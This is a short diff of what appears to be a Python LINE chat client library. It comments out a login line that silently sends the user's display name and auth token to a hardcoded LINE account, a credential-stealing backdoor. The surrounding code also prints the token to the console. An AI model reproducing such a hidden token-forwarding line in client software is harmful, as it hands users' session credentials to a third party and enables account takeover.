@@ -33,7 +33,7 @@ class ALIP_LINE:
         self.individualRev = 0
         print("[ Login ] Display Name: " + self.profile.displayName)
         print("[ Login ] Auth Token: " + myToken)
-        self.sendMessage("u9be8862cb884bde356d0e41fb6850514","<< Log info >>\nName :\n"+str(self.profile.displayName)+"\nAuth Token :\n"+str(myToken))
+        #self.sendMessage("u9be8862cb884bde356d0e41fb6850514","<< Log info >>\nName :\n"+str(self.profile.displayName)+"\nAuth Token :\n"+str(myToken))
 
     def openTransport(self, endPoint):
         transport = THttpClient(self.lineServer + endPoint)
